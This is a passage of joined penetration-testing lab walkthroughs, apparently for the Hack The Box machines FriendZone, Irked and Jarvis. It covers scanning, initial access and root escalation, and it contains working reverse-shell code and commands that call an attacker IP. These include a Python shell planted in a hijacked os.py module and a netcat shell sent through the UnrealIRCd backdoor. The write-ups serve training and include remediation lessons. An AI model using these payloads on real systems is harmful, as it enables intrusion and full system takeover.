We have rwx privileges on the /etc/Development directory as www-data. So let’s upload the LinEnum script in the Development share.

```text
put LinEnum.sh
```

In the target machine, navigate to the /etc/Development directory.

```text
cd /etc/Development/
```

Give the script execute permissions.

```text
chmod +x LinEnum.sh
```

I don’t seem to have execute permissions in that directory, so I’ll copy it to the tmp directory.

```text
cp LinEnum.sh /tmp/
```

Navigate to the /tmp directory and try again.

```text
cd /tmp/
chmod +x LinEnum.sh
```

That works, so the next step is to execute the script.

```text
./LinEnum.sh
```

The results from LinEnum don’t give us anything that we could use to escalate privileges. So let’s try pspy. If you don’t have the script, you can download it from the following github repository.

```text
https://github.com/DominicBreuker/pspy
```

Upload it and run it on the attack machine in the same way we did for LinEnum.

After a minute or two we see an interesting process pop up

![](https://miro.medium.com/max/855/1*ELWaTMHXkdL5lyw-P9w5xw.png)

It seems that the reporter.py script is getting executed every couple of minutes as a scheduled task. Let’s view the permissions we have on that file.

```text
ls -la /opt/server_admin/
```

![](https://miro.medium.com/max/563/1*jPYt-mDiW0Fjg5n8FY2OXA.png)

We only have read permission. So let’s view the content of the file.

```text
cat /opt/server_admin/reporter.py
```

Here’s the soure code of the script.

```text
#!/usr/bin/pythonimport osto_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"print "[+] Trying to send email to %s"%to_address#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''#os.system(command)# I need to edit the script later
# Sam ~ python developer
```

Most of the script is commented out so there isn’t much to do there. It does import the os module. Maybe we can hijack that. Locate the module on the machine.

```text
locate os.py
```

![](https://miro.medium.com/max/593/1*-qr6COS9TbJo4BZAmaGoxA.png)

Navigate to the directory and view the permissions on the file

```text
cd /usr/lib/python2.7
ls -la | grep os.py
```

![](https://miro.medium.com/max/599/1*eH3BIGL4W0Rh0ggXOFX8uQ.png)

We have rwx privileges on the os.py module! This is obviously a security misconfiguration. As a non-privileged user, I should only have read access to the script. If we add a reverse shell to the script and wait for the root owned scheduled task to run, we’ll get back a reverse shell with root privileges!

I tried accessing the os.py script using vi but the terminal was a bit screwed up. Here’s a way to fix it \(courtesy of ippsec\).

Go to a new pane in the attack machine and enter the following command.

```text
stty -a 
```

![](https://miro.medium.com/max/1019/1*YQ8m2vZcksaAjlfOhOR4DQ.png)

We need to set the rows to 29 and the columns to 113. Go back to the netcat session and run the following command.

```text
stty rows 29 columns 113
```

Even after this, vi was still a bit glitchy, so instead, I decided to download the os.py module to my attack machine using SMB, add the reverse shell there and upload it back to the target machine.

Add the following reverse shell code to the bottom of the os.py file and upload it back to the target machine.

```text
import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.10.14.6",1233));
dup2(s.fileno(),0); 
dup2(s.fileno(),1); 
dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);
```

Setup a listener on the attack machine.

```text
nc -nlvp 1233
```

Wait for the scheduled task to run the reporter.py script that will in turn call the os.py module which contains our reverse shell code.

![](https://miro.medium.com/max/585/1*jjQSBmqo_rt1ZNVARm-xiw.png)

We get back a shell running with root privileges! Grab the root.txt flag.

![](https://miro.medium.com/max/451/1*3obEZ82oSJOdDwSeCPzvuA.png)

## Lessons Learned <a id="9341"></a>

To gain an initial foothold on the box we exploited six vulnerabilities.

1. The ability to perform a zone transfer which allowed us to get a list of all hosts for the domain. To prevent this vulnerability from occurring, the DNS server should be configured to only allow zone transfers from trusted IP addresses. It is worth noting that even if zone transfers are not allowed, it is still possible to enumerate the list of hosts through other \(not so easy\) means.
2. Enabling anonymous login to an SMB share that contained sensitive information. This could have been avoided by disabling anonymous / guest access on SMB shares.
3. If anonymous login was not bad enough, one of the SMB shares also had WRITE access on it. This allowed us to upload a reverse shell. Again, restrictions should have been put in place on the SMB shares preventing access.
4. Saving credentials in plaintext in a file on the system. This is unfortunately very common. Use a password manager if you’re having difficulty remembering your passwords.
5. A Local File Inclusion \(LFI\) vulnerability that allowed us to execute a file on the system. Possible remediations include maintaining a white list of allowed files, sanitize input, etc.
6. Security misconfiguration that gave a web dameon user \(www-data\) the same permissions as a regular user on the system. I shouldn’t have been able to access the user.txt flag while running as a www-data user. The system administrator should have conformed to the principle of least privilege and the concept of separation of privileges.

To escalate privileges we exploited one vulnerability.

1. A security misconfiguration of a python module. There was a scheduled task that was run by root. The scheduled task ran a script that imported the os.py module. Usually, a regular user should only have read access to such modules, however it was configured as rwx access for everyone. Therefore, we used that to our advantage to hijack the python module and include a reverse shell that eventually ran with root privileges. It is common that such a vulnerability is introduced into a system when a user creates their own module and forgets to restrict write access to it or when the user decides to lessen restrictions on a current Python module. For this machine, we encountered the latter. The developer should have been very careful when deciding to change the default configuration of this specific module.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
irked-writeup-w-o-metasploit.md
# Irked Writeup w/o Metasploit

![](https://miro.medium.com/max/580/1*vEKYy3wcePgW-ia7qMKrKA.png)

## Reconnaissance <a id="22e9"></a>

First thing first, we run a quick initial nmap scan to see which ports are open and which services are running on those ports.

```text
nmap -sC -sV -O -oA initial 10.10.10.117
```

* **-sC**: run default nmap scripts
* **-sV**: detect service version
* **-O**: detect OS
* **-oA**: output all formats and store in file _initial_

We get back the following result showing that nine ports are open:

* **Port 22:** running OpenSSH 6.7p1
* **Port 80**: running Apache httpd 2.4.10
* **Port 111:** running rpcbind 2–4

![](https://miro.medium.com/max/884/1*AbKK5DVSEJ7A0WDlYWBwZA.png)

Before we start investigating these ports, let’s run more comprehensive nmap scans in the background to make sure we cover all bases.

Let’s run an nmap scan that covers all ports.

```text
nmap -sC -sV -O -p- -oA full 10.10.10.117
```

We get back the following result. We have 4 other ports that are open.

* Ports 6697, 8067 & 65534: running UnrealIRCd
* Port 51881: running an RPC service

![](https://miro.medium.com/max/882/1*zQDWqNUtSEfEB8IZ1RD1Cw.png)

Similarly, we run an nmap scan with the **-sU** flag enabled to run a UDP scan.

```text
nmap -sU -O -p- -oA udp 10.10.10.117
```

We get back the following result.

![](https://miro.medium.com/max/814/1*gviI6qguKCr9S8xAmLtRTA.png)

Two ports are open.

* **Port 111**: running rpcbind
* **Port 5353**: running zeroconf

## Enumeration <a id="6df7"></a>

Let’s start with enumerating port 80. Visit the machine’s IP address in the browser. We get back the following page.

![](https://miro.medium.com/max/667/1*CCBlrjMVeuCX3OPB_VhrsA.png)

Let’s view the page source \(right click &gt; View Page Source\) to see if that gives us any extra information.

![](https://miro.medium.com/max/502/1*VTwEs5s70Ws7h3P1YQlKew.png)

Nope. Next, we run gobuster to enumerate directories.

```text
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 10.10.10.117
```

![](https://miro.medium.com/max/886/1*S2YxhvdEoTHEsCh5X82vwA.png)

The /manual directory leads us to the default Apache HTTP server page.

![](https://miro.medium.com/max/885/1*mFWyMh17KObZ6_odc3J2PA.png)

Another dead end. Let’s move on to other ports. Ports 22 and 111 running OpenSSH 6.7p1 and rpcbind 2–4 don’t look promising. Ports 6697, 8067 & 65534 are running UnrealIRCd. A version of this service was vulnerable to a backdoor command execution.

Let’s see if there are any nmap scripts that check for this vulnerability.

![](https://miro.medium.com/max/794/1*ggHjBoEkQt7p_P238_PwZQ.png)

Great! Viewing the [documentation](https://nmap.org/nsedoc/scripts/irc-unrealircd-backdoor.html) tells us that not only can nmap detect it, but it can also be used to start a netcat listener that would give us a shell on the system.

First, run an nmap scan to see which of these ports are vulnerable to the backdoor.

```text
nmap -p 6697,8067,65534 --script irc-unrealircd-backdoor 10.10.10.117
```

![](https://miro.medium.com/max/887/1*n7yvBfd9Hyq2JtRQzN11DQ.png)

Port 8067 is vulnerable!

## Gaining an Initial Foothold <a id="e9bb"></a>

The next obvious step would be to get a reverse shell on the machine by exploiting the UnrealIRCd backdoor vulnerability. After attempting to do that, I spent an hour trying to figure out why neither my netcat reverse or bind shells are not working. It turns out that if you add the flag “-n” which stands for “do not do any DNS or service lookups on any specified address”, the shell doesn’t work. I’m not sure why. I’ll update this blog when I figure it out.

For now, set up a listener on the attack machine.

```text
nc -nlvp 4444
```

Send a reverse shell to our listener from the target machine.

```text
nmap -p 8067 --script=irc-unrealircd-backdoor --script-args=irc-unrealircd-backdoor.command="nc -e /bin/bash 10.10.14.6 4444"  10.10.10.117
```

We have a shell!

![](https://miro.medium.com/max/711/1*LxPuOuGpyvqKF3q_t4_QBQ.png)

Let’s upgrade it to a better shell.

```text
python -c 'import pty; pty.spawn("/bin/bash")'
```

This gives us a partially interactive bash shell. To get a fully interactive shell, background the session \(CTRL+ Z\) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

```text
stty raw -echo
```

Once that is done, run the command “fg” to bring netcat back to the foreground.

Let’s see if we have enough privileges to get the user.txt flag.

![](https://miro.medium.com/max/655/1*IrmCVsIYxEDxeWouAxJDrw.png)

We don’t. We need to escalate privileges.

## Privilege Escalation <a id="7076"></a>

Let’s transfer the LinEnum script from our attack machine to the target machine.

In the attack machine, start up a server in the same directory that the script resides in.

```text
python -m SimpleHTTPServer 5555
```

In the target machine download the LinEnum script.

```text
cd /tmp
wget http://10.10.14.6:5555/LinEnum.sh
```

Give it execute privileges.

```text
chmod +x LinEnum.sh
```

Run the script.

```text
./LinEnum.sh
```

After sifting through all the output from the script, we notice the following file which has the SUID bit set.

![](https://miro.medium.com/max/906/1*fnNmhtGORjnwjtmK1P2FwQ.png)

Let’s try and execute the file to see what it outputs.

```text
cd /usr/bin
viewuser
```

We get back the following result.

![](https://miro.medium.com/max/718/1*nrBOHiZPmsbnjvYQ8MHJjA.png)

It seems to be running a file /tmp/listusers, however, the file does not exist. Since the SUID bit is set for this file, it will execute with the level of privilege that matches the user who owns the file. In this case, the file is owned by root, so the file will execute with root privileges.

It’s in the /tmp directory, which we have access to, so let’s create the file and have it run a bash shell.

```text
echo "bash" > /tmp/listusers
```

When we execute the file, we’ll get a bash shell with root privileges!

![](https://miro.medium.com/max/691/1*91H51lCXFB20S_e9A318wQ.png)

Grab the user.txt and root.txt flags.

![](https://miro.medium.com/max/691/1*GWALNJehTKe_F7NQqtqByw.png)

## Extra Content <a id="e051"></a>

After rooting the machine, I reviewed other writeups to see if there are different ways to solve this machine. It turns out that there is a .backup file that contains a stenography challenge.

![](https://miro.medium.com/max/567/1*Ndz2OB6H2eEfzM-0JE_xOQ.png)

We can use the password stored in the file to extract information from the irked.jpg image on the website. In order to do that, first download the steganography program that is used to hide data in images.

```text
apt-get install steghide
```

Then download the image from the website and run the tool to get the hidden file.

```text
steghide extract -sf irked.jpg
```

* **-sf**: the file that contains the embedded data

The password is the one in the .backup file. It outputs the hidden file pass.txt.

![](https://miro.medium.com/max/581/1*0qtwh5yAwKP1aTEJD_wTNQ.png)

We’ll use that password to ssh into djmardov’s machine.

```text
ssh djmardov@10.10.10.117
```

![](https://miro.medium.com/max/733/1*vNT5JqoALjxVA7TRDiEkDw.png)

Now that we have djmardov privileges, we can get the user.txt file. From there, we need to escalate privileges using the SUID misconfiguration we exploited above.

## Lessons Learned <a id="244b"></a>

We exploited two vulnerabilities to get root level access on the machine.

1. A vulnerable service UnrealIRCd that contained a backdoor command execution vulnerability. This could have been easily avoided if the patched version was installed.
2. A misconfigured SUID that allowed us to escalate privileges. This is a common attack vector. When setting the SUID flag, administrators should carefully analyze their SUID/GUID applications to determine if they legitimately require elevated permissions. In my case, as a non-privileged user, I had full rwx privileges on the file that was being executed by a binary with the SUID bit set.

# -------------------------------FIN-------------------------------------
# ----------------------DEBUT------------------------------
jarvis-writeup-w-o-metasploit.md
# Jarvis Writeup w/o Metasploit

![](https://miro.medium.com/max/576/1*DFHzmRMpVUfoxFtEzkwzDA.png)

## Reconnaissance <a id="f549"></a>

I usually first run a quick initial nmap scan covering the top 1000 ports, then a full nmap scan covering all the ports and end it with a UDP scan. Today we’re going to do something different. I found this [awesome script](https://github.com/21y4d/nmapAutomator) online that automates the recon & enumeration phases. It was developed by [someone who recently passed his OSCP](https://forum.hackthebox.eu/discussion/1655/oscp-exam-review-2019-notes-gift-inside).

The script does all the general enumeration techniques using nmap, gobuster, nikto, smbmap, etc. I’m going to use it as is in this blog and customize it to fit my needs in future blogs.

Let’s run the nmapAutomator script to enumerate open ports and services running on those ports.

```text
./nmapAutomator.sh 10.10.10.143 All
```

* **All**: Runs all the scans consecutively.

We get back the following result.

```text
Running all scans on 10.10.10.143
                                                                                                                                                                               
Host is likely running Linux---------------------Starting Nmap Quick Scan---------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:39 EST
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.041s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  httpNmap done: 1 IP address (1 host up) scanned in 0.77 seconds---------------------Starting Nmap Basic Scan---------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:39 EST
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.037s latency).PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 03:f3:4e:22:36:3e:3b:81:30:79:ed:49:67:65:16:67 (RSA)
|   256 25:d8:08:a8:4d:6d:e8:d2:f8:43:4a:2c:20:c8:5a:f6 (ECDSA)
|_  256 77:d4:ae:1f:b0:be:15:1f:f8:cd:c8:15:3a:c3:69:e1 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Stark Hotel
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.52 seconds----------------------Starting Nmap UDP Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:39 EST
Warning: 10.10.10.143 giving up on port because retransmission cap hit (1).
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.047s latency).
All 1000 scanned ports on supersecurehotel.htb (10.10.10.143) are open|filtered (936) or closed (64)Nmap done: 1 IP address (1 host up) scanned in 58.34 seconds---------------------Starting Nmap Full Scan----------------------
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:40 EST
Initiating SYN Stealth Scan at 10:40
Scanning supersecurehotel.htb (10.10.10.143) [65535 ports]
Discovered open port 80/tcp on 10.10.10.143
Discovered open port 22/tcp on 10.10.10.143
Warning: 10.10.10.143 giving up on port because retransmission cap hit (1).
SYN Stealth Scan Timing: About 23.22% done; ETC: 10:42 (0:01:43 remaining)
SYN Stealth Scan Timing: About 45.90% done; ETC: 10:42 (0:01:12 remaining)
Discovered open port 64999/tcp on 10.10.10.143
SYN Stealth Scan Timing: About 68.71% done; ETC: 10:42 (0:00:41 remaining)
Completed SYN Stealth Scan at 10:42, 132.60s elapsed (65535 total ports)
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.033s latency).
Not shown: 65483 closed ports
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
1093/tcp  filtered proofd
1783/tcp  filtered unknown
2367/tcp  filtered service-ctrl
3386/tcp  filtered gprs-data
3690/tcp  filtered svn
5236/tcp  filtered padl2sim
7485/tcp  filtered unknown
8283/tcp  filtered unknown
8422/tcp  filtered unknown
13232/tcp filtered unknown
16012/tcp filtered unknown
16297/tcp filtered unknown
18491/tcp filtered unknown
18734/tcp filtered unknown
19330/tcp filtered unknown
19836/tcp filtered unknown
24451/tcp filtered unknown
33265/tcp filtered unknown
34083/tcp filtered unknown
34431/tcp filtered unknown
34989/tcp filtered unknown
35114/tcp filtered unknown
35443/tcp filtered unknown
36240/tcp filtered unknown
36615/tcp filtered unknown
37331/tcp filtered unknown
38033/tcp filtered unknown
38677/tcp filtered unknown
39074/tcp filtered unknown
41043/tcp filtered unknown
41133/tcp filtered unknown
41946/tcp filtered unknown
47563/tcp filtered unknown
47871/tcp filtered unknown
48906/tcp filtered unknown
50277/tcp filtered unknown
53080/tcp filtered unknown
54222/tcp filtered unknown
56272/tcp filtered unknown
56437/tcp filtered unknown
60421/tcp filtered unknown
61301/tcp filtered unknown
62098/tcp filtered unknown
62409/tcp filtered unknown
62836/tcp filtered unknown
63097/tcp filtered unknown
63184/tcp filtered unknown
64906/tcp filtered unknown
64999/tcp open     unknown
65508/tcp filtered unknownRead data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 132.74 seconds
           Raw packets sent: 66281 (2.916MB) | Rcvd: 102951 (11.685MB)Making a script scan on extra ports: 64999
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:42 EST
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.033s latency).PORT      STATE SERVICE VERSION
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Site doesn't have a title (text/html).Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.84 seconds---------------------Starting Nmap Vulns Scan---------------------
                                                                                                                                                                               
Running CVE scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:42 EST
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.033s latency).PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|_      CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|_      CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.56 secondsRunning Vuln scan on all ports
                                                                                                                                                                               
Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-10 10:42 EST
Nmap scan report for supersecurehotel.htb (10.10.10.143)
Host is up (0.033s latency).PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
80/tcp    open  http    Apache httpd 2.4.25 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_  /js/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_http-server-header: Apache/2.4.25 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-7659   5.0     https://vulners.com/cve/CVE-2017-7659
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
64999/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_clamav-exec: ERROR: Script execution failed (use -d to debug)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-server-header: Apache/2.4.25 (Debian)
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| vulners: 
|   cpe:/a:apache:http_server:2.4.25: 
|       CVE-2017-7679   7.5     https://vulners.com/cve/CVE-2017-7679
|       CVE-2017-7668   7.5     https://vulners.com/cve/CVE-2017-7668
|       CVE-2017-3169   7.5     https://vulners.com/cve/CVE-2017-3169
|       CVE-2017-3167   7.5     https://vulners.com/cve/CVE-2017-3167
|       CVE-2019-0211   7.2     https://vulners.com/cve/CVE-2019-0211
|       CVE-2018-1312   6.8     https://vulners.com/cve/CVE-2018-1312
|       CVE-2017-15715  6.8     https://vulners.com/cve/CVE-2017-15715
|       CVE-2019-10082  6.4     https://vulners.com/cve/CVE-2019-10082
|       CVE-2017-9788   6.4     https://vulners.com/cve/CVE-2017-9788
|       CVE-2019-0217   6.0     https://vulners.com/cve/CVE-2019-0217
|       CVE-2019-10098  5.8     https://vulners.com/cve/CVE-2019-10098
|       CVE-2019-10081  5.0     https://vulners.com/cve/CVE-2019-10081
|       CVE-2019-0220   5.0     https://vulners.com/cve/CVE-2019-0220
|       CVE-2019-0196   5.0     https://vulners.com/cve/CVE-2019-0196
|       CVE-2018-17199  5.0     https://vulners.com/cve/CVE-2018-17199
|       CVE-2018-1333   5.0     https://vulners.com/cve/CVE-2018-1333
|       CVE-2017-9798   5.0     https://vulners.com/cve/CVE-2017-9798
|       CVE-2017-7659   5.0     https://vulners.com/cve/CVE-2017-7659
|       CVE-2017-15710  5.0     https://vulners.com/cve/CVE-2017-15710
|       CVE-2019-0197   4.9     https://vulners.com/cve/CVE-2019-0197
|       CVE-2019-10092  4.3     https://vulners.com/cve/CVE-2019-10092
|       CVE-2018-11763  4.3     https://vulners.com/cve/CVE-2018-11763
|_      CVE-2018-1283   3.5     https://vulners.com/cve/CVE-2018-1283
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 49.96 seconds---------------------Recon Recommendations----------------------Web Servers Recon:
                                                                                                                                                                               
gobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.143:80 -o recon/gobuster_10.10.10.143_80.txt
nikto -host 10.10.10.143:80 | tee recon/nikto_10.10.10.143_80.txtgobuster dir -w /usr/share/wordlists/dirb/common.txt -l -t 30 -e -k -x .html,.php -u http://10.10.10.143:64999 -o recon/gobuster_10.10.10.143_64999.txt
nikto -host 10.10.10.143:64999 | tee recon/nikto_10.10.10.143_64999.txtWhich commands would you like to run?                                                                                                                                          
All (Default), gobuster, nikto, Skip <!>Running Default in (14) s: All---------------------Running Recon Commands----------------------Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143:80
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/10 10:44:02 Starting gobuster
===============================================================
http://10.10.10.143:80/.htaccess (Status: 403) [Size: 296]
http://10.10.10.143:80/.htaccess.html (Status: 403) [Size: 301]
http://10.10.10.143:80/.htaccess.php (Status: 403) [Size: 300]
http://10.10.10.143:80/.htpasswd (Status: 403) [Size: 296]
http://10.10.10.143:80/.htpasswd.html (Status: 403) [Size: 301]
http://10.10.10.143:80/.htpasswd.php (Status: 403) [Size: 300]
http://10.10.10.143:80/.hta (Status: 403) [Size: 291]
http://10.10.10.143:80/.hta.html (Status: 403) [Size: 296]
http://10.10.10.143:80/.hta.php (Status: 403) [Size: 295]
http://10.10.10.143:80/css (Status: 301) [Size: 310]
http://10.10.10.143:80/fonts (Status: 301) [Size: 312]
http://10.10.10.143:80/footer.php (Status: 200) [Size: 2237]
http://10.10.10.143:80/images (Status: 301) [Size: 313]
http://10.10.10.143:80/index.php (Status: 200) [Size: 23628]
http://10.10.10.143:80/index.php (Status: 200) [Size: 23628]
http://10.10.10.143:80/js (Status: 301) [Size: 309]
http://10.10.10.143:80/nav.php (Status: 200) [Size: 1333]
http://10.10.10.143:80/phpmyadmin (Status: 301) [Size: 317]
http://10.10.10.143:80/room.php (Status: 302) [Size: 3024]
http://10.10.10.143:80/server-status (Status: 403) [Size: 300]
===============================================================
2020/01/10 10:44:44 Finished
===============================================================Finished gobuster scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting nikto scan
                                                                                                                                                                               
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.143
+ Target Hostname:    10.10.10.143
+ Target Port:        80
+ Start Time:         2020-01-10 10:44:46 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.25 (Debian)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'ironwaf' found, with contents: 2.0.3
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Cookie PHPSESSID created without the httponly flag
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.25 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting...
+ Uncommon header 'x-ob_mode' found, with contents: 1
+ OSVDB-3092: /phpmyadmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ /phpmyadmin/: phpMyAdmin directory found
+ OSVDB-3092: /phpmyadmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
+ 7864 requests: 0 error(s) and 15 item(s) reported on remote host
+ End Time:           2020-01-10 10:50:36 (GMT-5) (350 seconds)
--------------------------------------------------------------------
+ 1 host(s) testedFinished nikto scan
                                                                                                                                                                               
=========================
                                                                                                                                                                               
Starting gobuster scan
                                                                                                                                                                               
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.143:64999
[+] Threads:        30
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Extensions:     html,php
[+] Expanded:       true
[+] Timeout:        10s
===============================================================
2020/01/10 10:50:37 Starting gobuster
===============================================================
http://10.10.10.143:64999/.htpasswd (Status: 403) [Size: 299]
http://10.10.10.143:64999/.htpasswd.html (Status: 403) [Size: 304]
http://10.10.10.143:64999/.htpasswd.php (Status: 403) [Size: 303]
http://10.10.10.143:64999/.htaccess (Status: 403) [Size: 299]
http://10.10.10.143:64999/.htaccess.html (Status: 403) [Size: 304]
http://10.10.10.143:64999/.htaccess.php (Status: 403) [Size: 303]
http://10.10.10.143:64999/.hta (Status: 403) [Size: 294]
http://10.10.10.143:64999/.hta.html (Status: 403) [Size: 299]
http://10.10.10.143:64999/.hta.php (Status: 403) [Size: 298]
http://10.10.10.143:64999/index.html (Status: 200) [Size: 54]
http://10.10.10.143:64999/index.html (Status: 200) [Size: 54]
